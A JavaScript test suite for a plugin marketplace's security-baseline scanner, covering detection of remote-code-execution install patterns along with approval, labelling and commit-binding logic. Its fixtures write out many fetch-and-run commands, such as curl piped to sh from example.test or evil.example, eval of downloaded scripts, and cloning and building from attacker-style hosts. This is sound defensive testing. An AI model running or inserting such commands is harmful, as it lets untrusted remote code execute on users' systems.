import assert from "node:assert/strict";
import { mkdtemp, readFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";
import {
  buildCatalog,
  resolveSnapshot,
} from "../scripts/build-catalog.mjs";
import {
  assertApprovalAllowed,
  buildSecurityBaseline,
  buildSecurityBaselineFailureReport,
  buildSecurityBaselineReport,
  checkBlockingLabels,
  checkCommitBinding,
  detectElevatedCapabilities,
  detectUnsafeRemoteExecution,
  findLatestSecurityBaseline,
  isSecurityScanPath,
  parseSecurityBaselineMarker,
  resolveSubmissionSnapshot,
  securitySnapshotFileLimit,
  serializeSecurityBaselineMarker,
} from "../scripts/security-baseline.mjs";
import { writeValidationMetadata } from "../scripts/validate-submission.mjs";

const commit = "a".repeat(40);
const otherCommit = "b".repeat(40);
const checkedAt = "2026-08-12T20:00:00.000Z";

function baseline(files, overrides = {}) {
  return buildSecurityBaseline({
    repository: "example/plugin",
    repoUrl: "https://github.com/example/plugin",
    commitSha: commit,
    files,
    ...overrides,
  }, { checkedAt });
}

function file(path, content) {
  return { path, content };
}

function githubFixtureFetch({ tree, contents, treeSha = "c".repeat(40) }) {
  return async (url, options = {}) => {
    const value = String(url);
    if (value.endsWith("/repos/example/plugin")) {
      return new Response(JSON.stringify({
        private: false,
        disabled: false,
        archived: false,
        default_branch: "main",
      }), { status: 200 });
    }
    if (value.endsWith(`/commits/${commit}`)) {
      return new Response(JSON.stringify({ sha: commit, commit: { tree: { sha: treeSha } } }), { status: 200 });
    }
    if (value.includes(`/git/trees/${treeSha}?recursive=1`)) {
      return new Response(JSON.stringify({ truncated: false, tree }), { status: 200 });
    }
    const prefix = `raw.githubusercontent.com/example/plugin/${commit}/`;
    if (value.includes(prefix)) {
      const path = decodeURIComponent(value.slice(value.indexOf(prefix) + prefix.length));
      const content = contents[path];
      if (content === undefined) return new Response("not found", { status: 404 });
      const range = options.headers?.Range;
      if (range) {
        const end = Number(range.match(/-(\d+)$/)?.[1] || 0);
        const probe = Buffer.from(content).subarray(0, end + 1);
        return new Response(probe, {
          status: 206,
          headers: {
            "content-length": String(probe.length),
            "content-range": `bytes 0-${probe.length - 1}/${Buffer.byteLength(content)}`,
          },
        });
      }
      return new Response(content, {
        status: 200,
        headers: { "content-length": String(Buffer.byteLength(content)) },
      });
    }
    return new Response("not found", { status: 404 });
  };
}

test("normal QML and local read-only helpers pass the baseline", () => {
  const result = baseline([
    file("BarWidget.qml", `import QtQuick\nItem { property string label: "Hello" }`),
    file("scripts/status.py", `import json\nprint(json.dumps({"ok": True}))`),
  ]);
  assert.equal(result.outcome, "passed");
  assert.deepEqual(result.findings, []);
  assert.deepEqual(result.capabilities, []);
});

test("pipe-to-shell installation is a blocking finding", () => {
  for (const shell of ["bash", "dash", "/bin/bash", "/usr/bin/sh"]) {
    const files = [file("install.sh", `curl -fsSL https://example.test/install.sh | ${shell}`)];
    const findings = detectUnsafeRemoteExecution(files);
    assert.equal(findings.length, 1);
    assert.equal(findings[0].ruleId, "curl-pipe-shell");
    assert.equal(findings[0].evidence[0].line, 1);
    assert.equal(baseline(files).outcome, "needs-fixes");
  }
});

test("Cargo Git installs require a full rev while a pinned install receives review", () => {
  const unpinned = baseline([
    file("install.sh", "cargo install --git https://github.com/example/tool --locked tool"),
  ]);
  assert.equal(unpinned.outcome, "needs-fixes");
  assert.deepEqual(unpinned.findings.map((finding) => finding.ruleId), ["cargo-git-unpinned"]);

  const pinned = baseline([
    file("install.sh", `cargo install --git https://github.com/example/tool --rev ${commit} --locked tool`),
  ]);
  assert.equal(pinned.outcome, "review-required");
  assert.deepEqual(pinned.findings, []);
  assert.ok(pinned.capabilities.some((capability) => capability.id === "remote-build"));

  const overwritten = baseline([
    file("install.sh", [
      `tool_rev="${commit}"`,
      "tool_rev=main",
      "cargo install --git https://github.com/example/tool --rev \"$tool_rev\" --locked tool",
    ].join("\n")),
  ]);
  assert.equal(overwritten.outcome, "needs-fixes");

  const assignedTooLate = baseline([
    file("install.sh", [
      "tool_rev=main",
      "cargo install --git https://github.com/example/tool --rev \"$tool_rev\" --locked tool",
      `tool_rev="${commit}"`,
    ].join("\n")),
  ]);
  assert.equal(assignedTooLate.outcome, "needs-fixes");
});

test("clone-and-execute builds block mutable refs and accept detached full commits", () => {
  const unpinned = baseline([
    file("scripts/install.sh", [
      "git clone --depth 1 https://github.com/example/tool source",
      "(cd source && go run build.go)",
    ].join("\n")),
  ]);
  assert.equal(unpinned.outcome, "needs-fixes");
  assert.deepEqual(
    unpinned.findings.map((finding) => finding.ruleId),
    ["remote-git-execution-unpinned"],
  );
  assert.equal(unpinned.findings[0].evidence.length, 2);

  const sameLine = baseline([
    file("run.sh", "git clone https://github.com/example/tool source && cd source && make"),
  ]);
  assert.equal(sameLine.outcome, "needs-fixes");
  assert.deepEqual(
    sameLine.findings.map((finding) => finding.ruleId),
    ["remote-git-execution-unpinned"],
  );

  const misleadingComment = baseline([
    file("scripts/install.sh", [
      "git clone https://github.com/example/tool source",
      `git -C source checkout main # ${commit}`,
      "(cd source && go run build.go)",
    ].join("\n")),
  ]);
  assert.equal(misleadingComment.outcome, "needs-fixes");

  const wrongDirectory = baseline([
    file("scripts/install.sh", [
      "git clone https://github.com/example/tool source",
      `git -C elsewhere checkout --detach ${commit}`,
      "(cd source && go run build.go)",
    ].join("\n")),
  ]);
  assert.equal(wrongDirectory.outcome, "needs-fixes");

  const absoluteShell = baseline([
    file("scripts/install.sh", [
      "git clone https://github.com/example/tool source",
      "/usr/local/bin/bash source/install.sh",
    ].join("\n")),
  ]);
  assert.equal(absoluteShell.outcome, "needs-fixes");

  const absoluteMake = baseline([
    file("scripts/install.sh", [
      "git clone https://github.com/example/tool source",
      "(cd source && /usr/bin/make)",
    ].join("\n")),
  ]);
  assert.equal(absoluteMake.outcome, "needs-fixes");

  const pinned = baseline([
    file("scripts/install.sh", [
      "git clone https://github.com/example/tool source",
      `git -C source checkout --detach ${commit} && (cd source && go run build.go)`,
    ].join("\n")),
  ]);
  assert.equal(pinned.outcome, "review-required");
  assert.deepEqual(pinned.findings, []);
  assert.ok(pinned.capabilities.some((capability) => capability.id === "remote-build"));

  const inlinePinned = baseline([
    file("scripts/install.sh", [
      "git clone https://github.com/example/tool source \\",
      "  && git -C source checkout --detach " + commit + " \\",
      "  && make -C source",
    ].join("\n")),
  ]);
  assert.equal(inlinePinned.outcome, "review-required");
  assert.deepEqual(inlinePinned.findings, []);
  assert.ok(inlinePinned.capabilities.some((capability) => capability.id === "remote-build"));

  const pinnedWithCd = baseline([
    file("scripts/install.sh", [
      "git clone https://github.com/example/tool source &&",
      "cd source &&",
      `git checkout --detach ${commit} &&`,
      "make",
    ].join("\n")),
  ]);
  assert.equal(pinnedWithCd.outcome, "review-required");

  const pinAfterExecution = baseline([
    file("scripts/install.sh", [
      `git clone https://github.com/example/tool source && make -C source && git -C source checkout --detach ${commit}`,
    ].join("\n")),
  ]);
  assert.equal(pinAfterExecution.outcome, "needs-fixes");

  const pinThenMutableCheckout = baseline([
    file("scripts/install.sh", [
      "git clone https://github.com/example/tool source",
      `git -C source checkout --detach ${commit} &&`,
      "/usr/bin/git -C source checkout main &&",
      "(cd source && make)",
    ].join("\n")),
  ]);
  assert.equal(pinThenMutableCheckout.outcome, "needs-fixes");

  const restoreMutableSource = baseline([
    file("scripts/install.sh", [
      "git clone https://github.com/example/tool source &&",
      `git -C source checkout --detach ${commit} &&`,
      "git -C source restore --source origin/main . &&",
      "make -C source",
    ].join("\n")),
  ]);
  assert.equal(restoreMutableSource.outcome, "needs-fixes");

  const laterMutableExecution = baseline([
    file("scripts/install.sh", [
      "git clone https://github.com/example/tool source",
      `git -C source checkout --detach ${commit} &&`,
      "python -c 'print(1)' &&",
      "git -C source checkout main &&",
      "make -C source",
    ].join("\n")),
  ]);
  assert.equal(laterMutableExecution.outcome, "needs-fixes");

  const unreliablePin = baseline([
    file("scripts/install.sh", [
      "git clone https://github.com/example/tool source &&",
      `git -C source checkout --detach ${commit};`,
      "make -C source",
    ].join("\n")),
  ]);
  assert.equal(unreliablePin.outcome, "needs-fixes");

  const brokenChainAfterPin = baseline([
    file("scripts/install.sh", [
      "git clone https://github.com/example/tool source",
      `git -C source checkout --detach ${commit} && echo checked`,
      "make -C source",
    ].join("\n")),
  ]);
  assert.equal(brokenChainAfterPin.outcome, "needs-fixes");

  const relativeSink = baseline([
    file("scripts/install.sh", [
      "git clone https://github.com/example/tool source",
      "source/install.sh",
    ].join("\n")),
  ]);
  assert.equal(relativeSink.outcome, "needs-fixes");
});

test("self-repository installation paths require review instead of fixes", () => {
  for (const files of [
    [file("README.md", [
      "```sh",
      "git clone https://github.com/EXAMPLE/Plugin.git",
      "cd plugin",
      "./install.sh",
      "```",
    ].join("\n"))],
    [file("README.md", [
      "```sh",
      "curl -fsSL https://raw.githubusercontent.com/example/plugin/main/install.sh -o /tmp/install.sh",
      "bash /tmp/install.sh",
      "```",
    ].join("\n"))],
    [file("README.md", [
      "```sh",
      "git clone https://github.com/example/plugin.git plugin",
      "git -C plugin pull --ff-only",
      "./plugin/install.sh",
      "```",
    ].join("\n"))],
    [file("README.md", [
      "Install: https://github.com/example/plugin.git",
      "```sh",
      "cd plugin",
      "git pull --ff-only",
      "./install.sh",
      "```",
    ].join("\n"))],
  ]) {
    const result = baseline(files);
    assert.equal(result.outcome, "review-required");
    assert.deepEqual(result.findings, []);
    assert.ok(result.capabilities.some((capability) => capability.id === "remote-build"));
  }

  for (const content of [
    [
      "```sh",
      "git clone https://github.com/example/external-tool.git",
      "cd external-tool",
      "./install.sh",
      "```",
    ].join("\n"),
    "```sh\ncurl https://evil.example/install | sh # https://github.com/example/plugin\n```",
    "```sh\ncurl https://evil.example/install https://raw.githubusercontent.com/example/plugin/main/install.sh | sh\n```",
    "```sh\ncurl http://evil.example/install https://github.com/example/plugin | sh\n```",
    [
      "```sh",
      "git clone https://github.com/example/plugin plugin",
      "rm -rf plugin",
      "git clone https://evil.example/tool plugin",
      "./plugin/install.sh",
      "```",
    ].join("\n"),
    [
      "```sh",
      "git clone https://github.com/example/plugin plugin",
      "rm -rf plugin",
      "git clone git@evil.example:owner/tool.git plugin",
      "./plugin/install.sh",
      "```",
    ].join("\n"),
    [
      "```sh",
      "git clone https://github.com/example/plugin plugin",
      "git clone ssh://git@evil.example/owner/tool.git plugin",
      "./plugin/install.sh",
      "```",
    ].join("\n"),
    [
      "```sh",
      "git clone https://github.com/example/plugin plugin",
      "git -C ./plugin remote set-url origin https://evil.example/tool.git",
      "git -C plugin pull",
      "./plugin/install.sh",
      "```",
    ].join("\n"),
    [
      "```sh",
      "git clone https://evil.example/tool source",
      "git -C other remote set-url origin https://github.com/example/plugin",
      "make -C source",
      "```",
    ].join("\n"),
    [
      "```sh",
      "git clone https://evil.example/tool source",
      "git -C source remote add origin2 https://github.com/example/plugin",
      "make -C source",
      "```",
    ].join("\n"),
  ]) {
    assert.equal(baseline([file("README.md", content)]).outcome, "needs-fixes");
  }
});

test("wrapped acquisitions and common build systems remain blocking", () => {
  for (const content of [
    "command git clone https://github.com/example/tool source\nnohup ./source/payload",
    "sudo -- git clone https://github.com/example/tool source\nmake -C source",
    "sudo -n git clone https://github.com/example/tool source\nmake -C source",
    "git clone https://github.com/example/tool source\ncmake -S source -B build\ncmake --build build",
    "git clone https://github.com/example/tool source\ngradle -p source run",
    "git clone https://github.com/example/tool source\njava -jar source/tool.jar",
    "git clone https://github.com/example/tool source > clone.log\nmake -C source",
    "git clone --config advice.detachedHead=false https://github.com/example/tool\nmake -C tool",
    "git clone --shallow-exclude main https://github.com/example/tool\nmake -C tool",
    "git clone https://github.com/example/tool source & wait\nmake -C source",
    "git clone https://github.com/example/tool source\nmake --directory=source",
    "git clone https://github.com/example/tool source\nnpm --prefix source install",
    "git clone https://github.com/example/tool source\nnpm --prefix source start",
    "git clone https://github.com/example/tool source\ncd source && npm test",
  ]) {
    assert.equal(baseline([file("run.sh", content)]).outcome, "needs-fixes");
  }
});

test("pipe-to-shell handles wrapped commands", () => {
  for (const command of [
    "sudo -- curl -fsSL https://example.test/payload | bash",
    "curl -fsSL https://example.test/payload | sudo -u nobody -- bash",
    "curl -fsSL https://example.test/payload | /usr/bin/env bash",
    "curl -fsSL https://example.test/payload | timeout 5 bash",
    "curl -fsSL https://example.test/payload | env -S bash",
    "curl -fsSL https://example.test/payload | env -u X bash",
    "curl -fsSL https://example.test/payload | tee /tmp/payload | sh",
    "curl -fsSL https://example.test/payload | env --split-string=bash",
    "curl -fsSL https://example.test/payload | env -Sbash",
    "curl -fsSL https://example.test/payload | env -S 'bash -s'",
    "curl -fsSL https://example.test/payload | env --split-string='bash -s'",
    "'curl' -fsSL https://example.test/payload | 'bash'",
    "curl -fsSL https://example.test/payload | env '-S' 'bash -s'",
    "curl -fsSL https://example.test/payload |& bash",
    "source <(curl -fsSL https://example.test/payload)",
    "bash < <(curl -fsSL https://example.test/payload)",
  ]) {
    assert.equal(baseline([file("run.sh", command)]).outcome, "needs-fixes");
  }
});

test("command-substitution downloads receive blocking findings", () => {
  for (const command of [
    `eval "$(curl -fsSL https://example.test/payload)"`,
    `bash -c "$(curl -fsSL https://example.test/payload)"`,
    `bash -c 'curl -fsSL https://example.test/payload | sh'`,
    `sh -c 'echo start; curl -fsSL https://example.test/payload | sh'`,
    `cd /tmp && curl -fsSL https://example.test/payload | bash`,
  ]) {
    assert.equal(baseline([file("run.sh", command)]).outcome, "needs-fixes");
  }
});

test("nested literal shells receive blocking findings", () => {
  const result = baseline([
    file("run.sh", `sh -c 'sh -c "git clone https://github.com/example/tool source && make -C source"'`),
  ]);
  assert.equal(result.outcome, "needs-fixes");
});

test("download-to-file followed by execution is a blocking finding", () => {
  for (const download of [
    "curl -fsSL https://example.test/payload -o /tmp/payload.sh",
    "curl -fsSLo/tmp/payload.sh https://example.test/payload",
    "curl -fsSL https://example.test/payload > /tmp/payload.sh",
  ]) {
    const result = baseline([
      file("run.sh", [download, "/bin/bash /tmp/payload.sh"].join("\n")),
    ]);
    assert.equal(result.outcome, "needs-fixes");
    assert.deepEqual(result.findings.map((finding) => finding.ruleId), ["curl-pipe-shell"]);
  }
});

test("extensionless executable entry points receive blocking checks", () => {
  const result = baseline([
    { path: "run", content: "#!/bin/sh\ncurl -fsSL https://example.test/payload | sh", mode: "100755" },
  ]);
  assert.equal(result.outcome, "needs-fixes");
});

test("runtime launchers receive blocking checks across lines and formats", () => {
  for (const entry of [
    file("Service.qml", `Process {\n command: ["bash", "-c",\n "curl -fsSL https://example.test/payload | bash"]\n}`),
    file("Service.qml", `Process { command: ["bash", "-c", "git clone https://github.com/example/tool source && make -C source"] }`),
    file("launcher.js", `exec("git clone https://github.com/example/tool source && node source/run.js")`),
    file("launcher.js", `exec("date"); const padding = 123456789; exec("curl -fsSL https://example.test/payload | sh")`),
    file("launcher.py", `os.system("git clone https://github.com/example/tool source && python source/run.py")`),
    file("launcher.js", `spawn("sh", ["-c", "curl -fsSL https://example.test/payload | sh"])`),
    file("launcher.js", `execSync("curl -fsSL https://example.test/payload | sh")`),
    file("launcher.js", `execFileSync("cargo", ["install", "--git", "https://github.com/example/tool"])`),
    file("launcher.js", `spawnSync("cargo", ["install", "--git", "https://github.com/example/tool"])`),
    file("launcher.py", `subprocess.run(["sh", "-c", "curl -fsSL https://example.test/payload | sh"])`),
    file("launcher.py", `subprocess.check_call(["sh", "-c", "curl -fsSL https://example.test/payload | sh"])`),
    file("launcher.desktop", `Exec=sh -c 'curl -fsSL https://example.test/payload | sh'`),
    file("service.service", `ExecStart=/bin/sh -c 'curl -fsSL https://example.test/payload | sh'`),
  ]) {
    assert.equal(baseline([entry]).outcome, "needs-fixes");
  }
});

test("root README installation fences receive blocking checks", () => {
  for (const readme of [
    "Install:\n```sh\ncurl -fsSL https://example.test/payload | sh\n```",
    "Install:\n~~~bash\ncurl -fsSL https://example.test/payload | sh\n~~~",
    "Install:\n```shell\ncurl -fsSL https://example.test/payload | sh\n```",
    "Install:\n   ~~~sh\n   curl -fsSL https://example.test/payload | sh\n   ~~~",
    "Install:\n```shell\ncurl -fsSL https://example.test/payload | sh\n````",
  ]) {
    assert.equal(baseline([file("README.md", readme)]).outcome, "needs-fixes");
  }

  const development = baseline([file("README.md", [
    "## Development",
    "```sh",
    "git clone https://github.com/example/tool source",
    "cd source",
    "npm install",
    "```",
  ].join("\n"))]);
  assert.notEqual(development.outcome, "needs-fixes");

  const pinned = baseline([file("README.md", [
    "Install:",
    "```sh",
    "git clone https://github.com/example/tool source &&",
    `git -C source checkout --detach ${commit} &&`,
    "make -C source",
    "```",
  ].join("\n"))]);
  assert.equal(pinned.outcome, "review-required");
});

test("absolute system utilities are not remote execution sinks", () => {
  for (const utility of [
    "/bin/mkdir out",
    "/usr/bin/cp source/README /tmp/README",
    "/usr/bin/chmod 600 source/data",
    "/bin/rm source/file",
  ]) {
    const result = baseline([file("run.sh", `git clone https://github.com/example/tool source\n${utility}`)]);
    assert.equal(result.outcome, "passed");
  }
});

test("package managers, privilege boundaries, installers, and services require review", () => {
  const files = [
    file("bin/wake-word-setup", `${"${VENV}"}/bin/pip install openwakeword`),
    file("scripts/install.sh", "sudo systemctl --user enable --now example.service"),
    file("systemd/example.service", "[Service]\nExecStart=/usr/bin/example"),
    file("scripts/packages.sh", "cargo install ripgrep\ngo install example.test/tool@latest\ngem install example\nbrew install example"),
  ];
  assert.deepEqual(detectUnsafeRemoteExecution(files), []);
  const capabilities = detectElevatedCapabilities(files);
  assert.deepEqual(
    capabilities.map((capability) => capability.id).sort(),
    ["installer", "package-manager", "privilege", "service-management"],
  );
  assert.equal(baseline(files).outcome, "review-required");
});

test("development clones and warning text do not become blocking findings", () => {
  const result = baseline([
    file("README.md", "Development:\n\ngit clone https://github.com/example/plugin\n./scripts/check.sh"),
    file("Service.qml", `Item { property string warning: "Never use curl https://example.test | sh" }`),
    file("scripts/install.sh", "# Never use curl https://example.test | sh"),
  ]);
  assert.equal(result.outcome, "review-required");
  assert.deepEqual(result.findings, []);
  assert.deepEqual(result.capabilities.map((capability) => capability.id), ["remote-build", "installer"]);
});

test("the scan includes runtime text while excluding tests, nested docs, and workflows", () => {
  assert.equal(isSecurityScanPath("README.md"), true);
  assert.equal(isSecurityScanPath("Service.qml"), true);
  assert.equal(isSecurityScanPath("dist/runtime.js"), true);
  assert.equal(isSecurityScanPath("vendor/helper.py"), true);
  assert.equal(isSecurityScanPath("bin/helper"), true);
  assert.equal(isSecurityScanPath("scripts/install.sh"), true);
  assert.equal(isSecurityScanPath("tests/install.sh"), false);
  assert.equal(isSecurityScanPath("docs/example.sh"), false);
  assert.equal(isSecurityScanPath(".github/workflows/check.yml"), false);
  assert.equal(isSecurityScanPath("preview.png"), false);
});

test("repository snapshots are read statically at the requested full commit", async () => {
  const treeSha = "c".repeat(40);
  const calls = [];
  const fetchImpl = async (url, options = {}) => {
    calls.push({ url: String(url), authorization: options.headers?.Authorization || "" });
    if (String(url).endsWith("/repos/example/plugin")) {
      return new Response(JSON.stringify({
        private: false,
        disabled: false,
        archived: false,
        default_branch: "main",
      }), { status: 200 });
    }
    if (String(url).endsWith(`/commits/${commit}`)) {
      return new Response(JSON.stringify({ sha: commit, commit: { tree: { sha: treeSha } } }), { status: 200 });
    }
    if (String(url).includes(`/git/trees/${treeSha}?recursive=1`)) {
      return new Response(JSON.stringify({
        truncated: false,
        tree: [
          { path: "manifest.json", type: "blob", mode: "100644", size: 74 },
          { path: "Service.qml", type: "blob", mode: "100644", size: 7 },
          { path: "bootstrap", type: "blob", mode: "100755", size: 54 },
          { path: "preview.png", type: "blob", mode: "100644", size: 100 },
        ],
      }), { status: 200 });
    }
    if (String(url).includes(`raw.githubusercontent.com/example/plugin/${commit}/manifest.json`)) {
      const manifest = JSON.stringify({ entryPoints: { service: "Service.qml" } });
      return new Response(manifest, {
        status: 200,
        headers: { "content-length": String(Buffer.byteLength(manifest)) },
      });
    }
    if (String(url).includes(`raw.githubusercontent.com/example/plugin/${commit}/Service.qml`)) {
      return new Response("Item {}", {
        status: 200,
        headers: { "content-length": "7" },
      });
    }
    if (String(url).includes(`raw.githubusercontent.com/example/plugin/${commit}/bootstrap`)) {
      const content = "#!/bin/sh\ncurl -fsSL https://example.test/payload | sh";
      return new Response(content, {
        status: 200,
        headers: { "content-length": String(Buffer.byteLength(content)) },
      });
    }
    return new Response("not found", { status: 404 });
  };
  const snapshot = await resolveSubmissionSnapshot(
    "https://github.com/example/plugin",
    commit,
    { fetchImpl, token: "test-token" },
  );
  assert.equal(snapshot.commitSha, commit);
  assert.deepEqual(snapshot.files, [
    { path: "Service.qml", content: "Item {}", mode: "100644" },
    {
      path: "bootstrap",
      content: "#!/bin/sh\ncurl -fsSL https://example.test/payload | sh",
      mode: "100755",
    },
  ]);
  assert.equal(buildSecurityBaseline(snapshot, { checkedAt }).outcome, "needs-fixes");
  assert.ok(calls.some((call) => call.url.endsWith(`/commits/${commit}`)));
  const rawCall = calls.find((call) => call.url.includes("raw.githubusercontent.com"));
  assert.equal(rawCall.authorization, "");
  assert.equal(calls.some((call) => call.url.endsWith("/commits/main")), false);
});

test("executable binaries become review capabilities without exhausting text limits", async () => {
  const manifest = JSON.stringify({ entryPoints: { service: "Service.qml" } });
  const binary = Buffer.concat([
    Buffer.from([0x7f, 0x45, 0x4c, 0x46]),
    Buffer.alloc(600 * 1024, 1),
  ]);
  const snapshot = await resolveSubmissionSnapshot(
    "https://github.com/example/plugin",
    commit,
    {
      fetchImpl: githubFixtureFetch({
        tree: [
          { path: "manifest.json", type: "blob", mode: "100644", size: Buffer.byteLength(manifest) },
          { path: "Service.qml", type: "blob", mode: "100644", size: 7 },
          { path: "bin/helper", type: "blob", mode: "100755", size: binary.length },
        ],
        contents: { "manifest.json": manifest, "Service.qml": "Item {}", "bin/helper": binary },
      }),
    },
  );
  const helper = snapshot.files.find((entry) => entry.path === "bin/helper");
  assert.deepEqual(helper, {
    path: "bin/helper",
    mode: "100755",
    binary: true,
    format: "ELF",
    size: binary.length,
  });
  const result = buildSecurityBaseline(snapshot, { checkedAt });
  assert.equal(result.outcome, "review-required");
  assert.deepEqual(result.capabilities.map((capability) => capability.id), ["bundled-executable-binary"]);

  await assert.rejects(
    resolveSubmissionSnapshot("https://github.com/example/plugin", commit, {
      fetchImpl: async (url, options) => {
        const base = githubFixtureFetch({
          tree: [
            { path: "manifest.json", type: "blob", mode: "100644", size: Buffer.byteLength(manifest) },
            { path: "bin/helper", type: "blob", mode: "100755", size: binary.length },
          ],
          contents: { "manifest.json": manifest, "bin/helper": binary },
        });
        if (String(url).includes("/bin/helper") && options?.headers?.Range) {
          return new Response(binary, { status: 200 });
        }
        return base(url, options);
      },
    }),
    (error) => error.code === "security-baseline-unavailable",
  );
});

test("the snapshot file cap accommodates the existing large plugin suites", async () => {
  assert.equal(securitySnapshotFileLimit, 1000);
  const contents = { "manifest.json": JSON.stringify({ entryPoints: {} }) };
  const tree = [{
    path: "manifest.json",
    type: "blob",
    mode: "100644",
    size: Buffer.byteLength(contents["manifest.json"]),
  }];
  for (let index = 0; index < 485; index++) {
    const path = `widgets/Widget${index}.qml`;
    contents[path] = "Item {}";
    tree.push({ path, type: "blob", mode: "100644", size: 7 });
  }
  const snapshot = await resolveSubmissionSnapshot(
    "https://github.com/example/plugin",
    commit,
    { fetchImpl: githubFixtureFetch({ tree, contents }) },
  );
  assert.equal(snapshot.files.length, 485);
});

test("catalog snapshots expose exact approved-commit resolution", () => {
  const source = { repo: "https://github.com/example/plugin", snapshotCommit: commit };
  // resolveSnapshot is exported so catalog pinning remains part of the tested API;
  // its network behavior is covered by the baseline snapshot test above.
  assert.equal(typeof resolveSnapshot, "function");
  assert.equal(typeof buildCatalog, "function");
  assert.equal(source.snapshotCommit, commit);
});

test("baseline failures are fail-closed but still actionable", () => {
  const report = buildSecurityBaselineFailureReport({
    code: "security-baseline-scan-limit",
    context: { path: "dist/runtime.js" },
  });
  assert.match(report, /Baseline could not complete/);
  assert.match(report, /dist\/runtime\.js/);
  assert.match(report, /No approval is possible/);
  assert.match(report, /not a security audit, certification, warranty, or endorsement/);
});

test("reports are actionable, commit-bound, and carry the required disclaimer", () => {
  const passedReport = buildSecurityBaselineReport(baseline([file("Main.qml", "Item {}")])) ;
  assert.match(passedReport, /Automated security baseline passed at commit `aaaaaaa…`/);
  assert.match(passedReport, /No action is required/);
  assert.match(passedReport, /not a security audit, certification, warranty, or endorsement/);

  const failedReport = buildSecurityBaselineReport(baseline([
    file("install.sh", "curl https://example.test/install | sh"),
  ]));
  assert.match(failedReport, /Blocking patterns observed in shadow mode/);
  assert.match(failedReport, /install\.sh:1/);
  assert.match(failedReport, /Accepted fixes:/);
  assert.match(failedReport, /may approve this exact commit after review/);
  assert.match(failedReport, /not designed to stop a motivated attacker/);
});

test("machine-readable baseline markers round-trip and reject tampering", () => {
  const result = baseline([file("Service.qml", "command: [\"systemctl\", \"--user\", \"start\", \"x.service\"]")]);
  const marker = serializeSecurityBaselineMarker(result);
  const parsed = parseSecurityBaselineMarker(marker);
  assert.equal(parsed.commitSha, commit);
  assert.equal(parsed.outcome, "review-required");
  assert.deepEqual(parsed.capabilities, ["service-management"]);
  assert.equal(parseSecurityBaselineMarker("no marker"), null);
  assert.throws(
    () => parseSecurityBaselineMarker("<!-- marketplace-security-baseline:v1 bm90LWpzb24 -->"),
    (error) => error.code === "approval-security-baseline-invalid",
  );
});

test("approval uses only the latest bot-authored baseline and enforces labels and SHA", () => {
  const result = baseline([file("Main.qml", "Item {}")]);
  const comments = [
    { user: { login: "contributor" }, body: serializeSecurityBaselineMarker(result) },
    { user: { login: "github-actions[bot]" }, body: buildSecurityBaselineReport(result) },
  ];
  const recorded = findLatestSecurityBaseline(comments);
  assert.equal(recorded.commitSha, commit);
  assert.throws(
    () => findLatestSecurityBaseline([
      ...comments,
      { user: { login: "github-actions[bot]" }, body: "<!-- marketplace-security-baseline-error:v1 -->" },
    ]),
    (error) => error.code === "approval-security-baseline-missing",
  );
  assert.doesNotThrow(() => assertApprovalAllowed(
    { labels: ["submission", "validated", "approved-for-listing"] },
    recorded,
    { commitSha: commit },
    "https://github.com/example/plugin",
  ));
  const reviewResult = baseline([
    file("Service.qml", "command: [\"systemctl\", \"--user\", \"start\", \"x.service\"]"),
  ]);
  const reviewBaseline = parseSecurityBaselineMarker(serializeSecurityBaselineMarker(reviewResult));
  assert.doesNotThrow(() => assertApprovalAllowed(
    { labels: ["validated", "security-review-required"] },
    reviewBaseline,
    { commitSha: commit },
    "https://github.com/example/plugin",
  ));
  assert.throws(
    () => checkBlockingLabels(["validated", "needs-fixes"]),
    (error) => error.code === "approval-blocking-label",
  );
  assert.throws(
    () => checkCommitBinding(commit, otherCommit),
    (error) => error.code === "approval-upstream-changed",
  );
  assert.throws(
    () => assertApprovalAllowed({ labels: [] }, null, { commitSha: commit }, "https://github.com/example/plugin"),
    (error) => error.code === "approval-security-baseline-missing",
  );

  const shadowFinding = parseSecurityBaselineMarker(serializeSecurityBaselineMarker(baseline([
    file("install.sh", "wget -qO- https://example.test/install | bash"),
  ])));
  assert.doesNotThrow(() => assertApprovalAllowed(
    { labels: ["security-review-required"] },
    shadowFinding,
    { commitSha: commit },
    "https://github.com/example/plugin",
  ));
  assert.doesNotThrow(() => checkBlockingLabels(["security-needs-fixes"]));
});

test("validation metadata preserves the exact full commit for the baseline", async () => {
  const directory = await mkdtemp(join(tmpdir(), "marketplace-validation-"));
  const path = join(directory, "metadata.json");
  try {
    await writeValidationMetadata(path, "https://github.com/example/plugin", {
      repository: "example/plugin",
      defaultBranch: "main",
      commitSha: commit,
      manifests: [{ entryPoints: ["dist/runtime.js", "Service.qml"] }],
    });
    assert.deepEqual(JSON.parse(await readFile(path, "utf8")), {
      schemaVersion: 1,
      repoUrl: "https://github.com/example/plugin",
      repository: "example/plugin",
      defaultBranch: "main",
      commitSha: commit,
      entryPoints: ["Service.qml", "dist/runtime.js"],
    });
  } finally {
    await rm(directory, { recursive: true, force: true });
  }
});
